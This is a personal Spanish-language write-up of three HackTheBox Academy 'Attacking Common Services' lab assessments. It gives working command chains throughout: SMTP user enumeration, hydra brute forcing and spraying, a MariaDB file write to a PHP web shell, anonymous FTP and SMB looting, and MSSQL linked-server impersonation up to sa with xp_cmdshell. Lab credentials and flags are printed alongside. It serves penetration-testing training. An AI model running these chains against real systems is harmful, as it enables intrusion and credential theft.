---
title: "Attacking Common Services — Skills Assessments (Easy / Medium / Hard)"
machine: "Attacking Common Services"
platform: "HackTheBox"
os: "Linux"
difficulty: "Hard"
tags: ["SMB", "RCE", "Privesc", "FTP", "Web"]
retired: true
summary: "Módulo HTB Academy · Writeup personal · Dominio objetivo: inlanefreight.htb"
draft: false
---
> Módulo HTB Academy · Writeup personal · Dominio objetivo: `inlanefreight.htb`
Tres servidores internos: correo+archivos (Easy), archivos+correo (Medium), archivos+base de datos (Hard).
> 

---

## Índice

---

## Metodología transversal

El módulo entero gira sobre un mismo patrón de "common services", que conviene tener interiorizado antes de tocar ninguna caja:

1. **Recon de puertos** — `nmap -p- --min-rate 5000` para descubrir, luego `sCV` afinado sobre los abiertos.
2. **Enumeración por servicio** — cada servicio es a la vez una posible entrada *y* un posible oráculo (filtra usuarios, versiones, archivos).
3. **Obtención de credencial** — anónimo, fuerza bruta dirigida, o archivos filtrados.
4. **Reúso de credencial** — la misma clave suele abrir varios servicios (correo → FTP → SSH/RDP → DB).
5. **Cobro** — leer la flag o ejecutar comandos según el rol del servicio final.

La idea central: **los servicios no se atacan aislados, se encadenan.** Una credencial en un servicio rara vez es el final; es la llave del siguiente.

---

## Easy — WIN-EASY

**Objetivo:** servidor Windows que gestiona correos, clientes y archivos.

### Recon

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 21 | FTP | Core FTP Server 2.0 build 725 |
| 25 / 587 | SMTP | hMailServer |
| 80 | HTTP | XAMPP (Apache 2.4.53 / PHP 7.4.29 / MariaDB) |
| 443 | HTTPS | Core FTP web (Basic auth) |
| 3306 | MySQL | MariaDB 10.4.24 |
| 3389 | RDP | Windows Server 2019, standalone (`WIN-EASY`) |

Standalone (no DC): `DNS_Domain_Name == Computer_Name == WIN-EASY`.

```bash
sudo nmap 10.129.X.X -p- --min-rate 5000 -Pn -n
sudo nmap 10.129.X.X -p 21,25,80,443,587,3306,3389 -sCV -Pn -oN targeted
```

### Cadena de ataque

```
SMTP (oráculo hMailServer) → fuerza bruta del correo → fiona:987654321
        → reúso en MariaDB (GRANT ALL) → secure_file_priv NULL
        → escritura de archivo en htdocs → RCE como NT AUTHORITY\SYSTEM
```

### Paso a paso

**1. SMTP como oráculo de usuarios.** hMailServer responde distinto a un destinatario válido vs inválido en el `RCPT TO`:

```bash
# 250 OK = válido | 550 Unknown user = no existe | 550 Account is not active = existe pero deshabilitado
printf 'EHLO x\r\nMAIL FROM:<a@b.c>\r\nRCPT TO:<fiona@inlanefreight.htb>\r\nQUIT\r\n' | nc -w 6 10.129.X.X 25
```

**2. Fuerza bruta de la contraseña.** El correo (no el FTP) es donde validó la credencial:

```bash
hydra -l fiona@inlanefreight.htb -P pws.list -f -t 1 smtp://10.129.X.X:25
# fiona@inlanefreight.htb : 987654321
```

**3. Reúso en MariaDB.** La credencial de correo también era usuario de MySQL (necesita desactivar SSL del lado cliente):

```bash
mysql -h 10.129.X.X -u fiona -p --skip-ssl
```

**4. Verificación del vector de escritura.** Dos condiciones que abren RCE:

```sql
SHOW GRANTS;                 -- GRANT ALL PRIVILEGES ON *.* → incluye FILE
SELECT @@secure_file_priv;   -- NULL → sin restricción de ruta para escritura de archivos
SELECT @@hostname;           -- WIN-EASY → escribimos en el target real
```

**5. Archivo de código en el webroot → RCE.** El webroot de XAMPP es `C:/xampp/htdocs`. Se escribe un intérprete de una sola línea (`system($_REQUEST[...])`) en un `.php` dentro de ese directorio mediante una consulta SQL con capacidad de escritura a disco, aprovechando el `secure_file_priv` desactivado.

```bash
curl 'http://10.129.X.X/s.php?c=whoami'
# nt authority\system   ← el servicio MariaDB de XAMPP corría como SYSTEM
```

**6. Cobro de la flag.** Con SYSTEM no hay ACL que frene:

```bash
curl 'http://10.129.X.X/s.php?c=type+C:\\Users\\Administrator\\Desktop\\flag.txt'
```

### Notas de esta caja

- `phpMyAdmin` daba **403**: XAMPP lo restringe a localhost. El cliente `mysql` contra el 3306 sí conecta desde fuera — el camino a la DB no es web.
- El **RDP nunca hizo falta**: la escritura de archivo vía SQL fue un atajo directo a SYSTEM. El "WIN-EASY" era una pista de pivote que el camino corto saltó.
- `C:\xampp\passwords.txt` es solo la **plantilla genérica** de XAMPP, no credenciales reales — no perder tiempo ahí.

---

## Medium — lin-medium

**Objetivo:** servidor interno de archivos y material de trabajo.

### Recon

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 22 | SSH | OpenSSH |
| 53 | DNS | **permite transferencia de zona (AXFR)** |
| 110 / 995 | POP3 / POP3S | Dovecot |
| 2121 | FTP | ProFTPD (InlaneFTP) — público |
| 30021 | FTP | ProFTPD (Internal FTP) — `int-ftp → 127.0.0.1` expuesto |

### El hallazgo: AXFR

El DNS mal configurado entrega el mapa de **toda la red interna**, no solo del host:

```bash
dig AXFR inlanefreight.htb @10.129.X.X
```

```
app.inlanefreight.htb.     A   10.129.200.5
dc1.inlanefreight.htb.     A   10.129.100.10   ← controlador de dominio
dc2.inlanefreight.htb.     A   10.129.200.10   ← controlador de dominio
int-ftp.inlanefreight.htb. A   127.0.0.1       ← FTP interno (expuesto en 30021)
int-nfs.inlanefreight.htb. A   10.129.200.70
wsus.inlanefreight.htb.    A   10.129.200.80
ws1/ws2 ...
```

### Cadena de ataque

```
AXFR (mapa de red) → ProFTPD interno (30021) anónimo → home de simon
        → mynotes.txt (lista de claves) → spray POP3 → simon:8Ns8j1b!23hs4921smHzwn
        → correo con clave SSH privada → SSH como simon → flag
```

### Paso a paso

**1. FTP interno anónimo.** El 2121 rechaza anónimo; el 30021 (interno) lo acepta:

```bash
curl -s --ftp-pasv "ftp://10.129.X.X:30021/" --user anonymous:anonymous -v
# 230 Anonymous access granted → directorio "simon"
```

**2. Botín en el home de simon:**

```bash
curl -s --ftp-pasv "ftp://10.129.X.X:30021/simon/mynotes.txt" --user anonymous:anonymous
```

`mynotes.txt` = lista de contraseñas candidatas (el clásico "archivo con todas mis claves").

**3. Password spraying dirigido por POP3.** Un usuario, ~8 claves → spray, no fuerza bruta:

```bash
hydra -l simon -P simon_pws.txt -f pop3://10.129.X.X:110
# simon : 8Ns8j1b!23hs4921smHzwn
```

**4. Leer el correo — el pivote real.** A diferencia de la Easy, aquí POP3 permite leer buzones:

```bash
{ printf 'USER simon\r\nPASS 8Ns8j1b!23hs4921smHzwn\r\nSTAT\r\nLIST\r\nRETR 1\r\nQUIT\r\n'; sleep 3; } | nc -w 6 10.129.X.X 110
```

El mensaje contenía una **clave SSH privada** para simon.

**5. Reconstruir la clave y entrar.** La clave venía aplastada en una línea — hay que restaurar el formato:

```bash
# extraer base64 entre los marcadores, re-foldear a 70 cols, envolver con BEGIN/END
chmod 600 id_rsa_simon
ssh-keygen -y -f id_rsa_simon   # validar antes de usar
ssh -i id_rsa_simon simon@10.129.X.X
# flag.txt en el home
```

### Notas de esta caja

- POP3 fue el servicio que validó (no SSH directamente): la credencial era de **correo**, y el correo era el pivote hacia la clave SSH.
- `ip a` mostró **una sola interfaz** → la máquina **no es dual-homed**. Los DCs del AXFR están en la misma /16 pero fuera del alcance del lab; el AXFR enseña *por qué* una zona transfer es peligrosa (revela infraestructura), no que haya que atacarla aquí.
- El `Maildir` con archivos `dovecot.*` son índices binarios, no correos — el único mensaje útil ya estaba leído por POP3.

---

## Hard — WIN-HARD

**Objetivo:** servidor interno de archivos + una base de datos "de propósito desconocido".

### Recon

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 135 | msrpc | Windows RPC |
| 445 | SMB | sesión nula permite listar shares |
| 1433 | MSSQL | Microsoft SQL Server 2019 RTM |
| 3389 | RDP | Windows Server 2019, standalone (`WIN-HARD`) |

### Lectura de las preguntas (antes del recon)

Las preguntas del módulo ya dibujan la cadena:

- Q1: archivo de simon → patrón de archivo filtrado.
- Q2: password de fiona → credencial.
- Q3: "qué otro usuario comprometes para ganar admin" + pista *"puedo reemplazar algún usuario"* → **impersonación en MSSQL**.
- Q4: flag en `Administrator\Desktop`.

### Cadena de ataque

```
SMB null session → Home\IT\ → creds.txt (fiona) + secrets.txt (john) + information.txt (pista)
        → RDP como fiona → MSSQL con Windows auth
        → IMPERSONATE john/simon (callejón) → linked server LOCAL.TEST.LINKED.SRV
        → doble impersonación: fiona → john → [enlace] → sa (sysadmin)
        → ejecución de comandos habilitada → flag
```

### Paso a paso

**1. SMB con sesión nula.** `smbclient` lista el share `Home` (nxc/smbmap petaban con un error de lectura del host):

```bash
smbclient -L //10.129.X.X/ -N
smbclient //10.129.X.X/Home -N -c 'recurse ON; ls'
```

Estructura `IT\` con carpetas por usuario. Descargar por ruta exacta (el `mget` con comodín fallaba):

```bash
smbclient //10.129.X.X/Home -N -c 'get IT\Fiona\creds.txt creds.txt'
smbclient //10.129.X.X/Home -N -c 'get IT\Simon\random.txt random.txt'
smbclient //10.129.X.X/Home -N -c 'get IT\John\information.txt information.txt'
smbclient //10.129.X.X/Home -N -c 'get IT\John\secrets.txt secrets.txt'
```

- **Q1** → archivo de simon: `random.txt`
- `Fiona\creds.txt` → lista "Windows Creds"
- `John\information.txt` → *"Create a local linked server. Simulate Impersonation."* (la pista maestra)
- `John\secrets.txt` → password list de john

**2. Validar la credencial de fiona.** Falla en MSSQL, entra en SMB (cuenta local de Windows):

```bash
nxc smb 10.129.X.X -u fiona -p fiona_pws.txt --local-auth
# [+] fiona : 48Ns72!bns74@S84NNNSl   ← Q2
```

**3. RDP como fiona.** Su credencial sirve para sesión interactiva:

```bash
xfreerdp /v:10.129.X.X /u:fiona /p:'48Ns72!bns74@S84NNNSl' \
  /dynamic-resolution +clipboard /cert:ignore \
  /drive:share,/home/kali/HTB/attack_module/loot_hard
```

**4. MSSQL con Windows auth (desde la sesión de fiona).** fiona no es sysadmin, pero puede impersonar:

```bash
sqlcmd -S localhost -E -Q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
-- WIN-HARD\Fiona | 0

sqlcmd -S localhost -E -Q "SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
-- john, simon
```

**5. Las ramas directas son callejones.** Tanto `john` como `simon` solo se impersonan a sí mismos y ninguno es sysadmin:

```bash
sqlcmd -S localhost -E -Q "EXECUTE AS LOGIN = 'john'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
-- john | 0   (idem simon)
```

**6. El vector real: linked server.** `information.txt` lo anticipaba:

```bash
sqlcmd -S localhost -E -Q "SELECT srvname, isremote FROM sysservers;"
-- WINSRV02\SQLEXPRESS    (remoto, inalcanzable - decorado)
-- LOCAL.TEST.LINKED.SRV  (local, contra sí mismo - el bueno)
```

**7. El doble salto.** La clave: impersonar a un login SQL localmente, cruzar el enlace, e impersonar a `sa` **dentro** del enlace:

```bash
sqlcmd -S localhost -E -Q "EXECUTE AS LOGIN = 'john'; EXEC('EXECUTE AS LOGIN = ''sa''; SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];"
-- sa | 1   ← sysadmin al otro lado del enlace · Q3 = john
```

**8. Cobro: habilitar ejecución de comandos por el enlace.**

```bash
sqlcmd -S localhost -E -Q "EXECUTE AS LOGIN = 'john'; EXEC('EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];"

sqlcmd -S localhost -E -Q "EXECUTE AS LOGIN = 'john'; EXEC('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];"
-- Q4: HTB{46u$!n9_l!nk3d_$3rv3r$}
```

### Errores intermedios y qué significaban (depuración del linked server)

| Error | Significado | Ajuste |
| --- | --- | --- |
| `untrusted domain ... Integrated authentication` | el contexto de Windows (fiona) no cruza el enlace | hay que impersonar un login **SQL** |
| `Linked servers cannot be used under impersonation without a mapping` | progreso: la impersonación funciona, falta mapeo | usar `EXEC ... AT` + doble salto a `sa` |
| `sp_helplinkedsrvlogin` → 0 rows | el enlace no tiene mapeo explícito | el contexto se hereda del login que cruza |

### Notas de esta caja

- El **RDP session hijacking** (`tscon` siendo SYSTEM) no aplicaba: `query user` mostró una sola sesión activa, sin sesión de admin que secuestrar. Pero la corazonada del hijacking fue lo que motivó entrar por RDP, que sí era el camino.
- `WINSRV02\SQLEXPRESS` era decorado (inalcanzable). Todo pasaba por `LOCAL.TEST.LINKED.SRV`.

---

## Lecciones para quedarse

**1. Los servicios se encadenan, no se atacan sueltos.**
Las tres cajas son la misma idea: credencial en un servicio → reúso en el siguiente → cobro en el último. Correo→DB (Easy), FTP→correo→SSH (Medium), SMB→RDP→DB (Hard). Pensar en *cadenas*, no en *puertos*.

**2. Cada servicio es también un oráculo.**
SMTP filtra usuarios válidos (`RCPT TO`). FTP/SMB filtran archivos. DNS filtra la red entera (AXFR). Antes de atacar un servicio, preguntarse qué *información* regala gratis.

**3. Password spraying dirigido > fuerza bruta a ciegas — pero valida la herramienta contra el servicio real.**
La regla general (listas cortas dirigidas, no rockyou contra servicios con throttling) es correcta en pentest profesional. PERO: en la Easy, hMailServer **no** tenía throttling agresivo y rockyou habría caído en ~1 min. *Lección doble:* el método se valida contra el servicio que tienes delante, no contra la regla memorizada. Cuando la lista corta del módulo está disponible, empieza por ahí; si no cae y el servicio no limita, escalar es legítimo.

**4. El reúso de credenciales es el corazón del movimiento lateral.**
Una clave de correo abrió MariaDB (Easy). Una de SMB abrió RDP (Hard). Siempre probar la credencial obtenida contra *todos* los servicios, no solo el de origen.

**5. Escritura de archivos habilitada en la base de datos + webroot conocido = RCE.**
El patrón XAMPP/MySQL → escritura de disco habilitada → archivo ejecutable en el webroot es oro. Verificar siempre los permisos de escritura a disco y los privilegios del usuario al entrar a una DB. Y ojo: el servicio DB puede correr como SYSTEM → RCE salta foothold y privesc de golpe.

**6. Impersonación de MSSQL y linked servers — el patrón "reemplazar usuario".**

- `IMPERSONATE` directo: `EXECUTE AS LOGIN = 'x'` para saltar entre logins SQL.
- Linked server contra sí mismo: doble salto `login SQL → [enlace] → sa`, porque el enlace hereda/eleva el contexto.
- Diferencia clave: `EXEC (...) AT [link]` propaga la impersonación; `OPENQUERY` reabre conexión y la pierde.
- Los errores son una brújula: "untrusted domain" → usa login SQL; "no mapping" → la impersonación ya va, ajusta el salto.

**7. Saber qué es decorado y qué es el vector.**
RDP en la Easy, los DCs del AXFR en la Medium, `WINSRV02` en la Hard — todo presente pero fuera del camino. Reconocer rápido qué pista es ruido evita perder horas.

**8. Higiene de engagement (para el reporte).**
Al cerrar: documentar artefactos dejados (archivo subido en htdocs, `filecreated`, etc.) como "cleanup pendiente". En un engagement real se limpia; en lab se anota como buena práctica.

---

### Resumen de flags

| Caja | Vector resumido | Flag |
| --- | --- | --- |
| Easy | SMTP → MariaDB escritura de archivo → SYSTEM | `HTB{ATT4CK1NG_F7P_53RV1C3}` *(de sesión previa)* |
| Medium | AXFR → FTP interno → POP3 → SSH key | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` |
| Hard | SMB → RDP → MSSQL linked server → sa | `HTB{46u$!n9_l!nk3d_$3rv3r$}` |
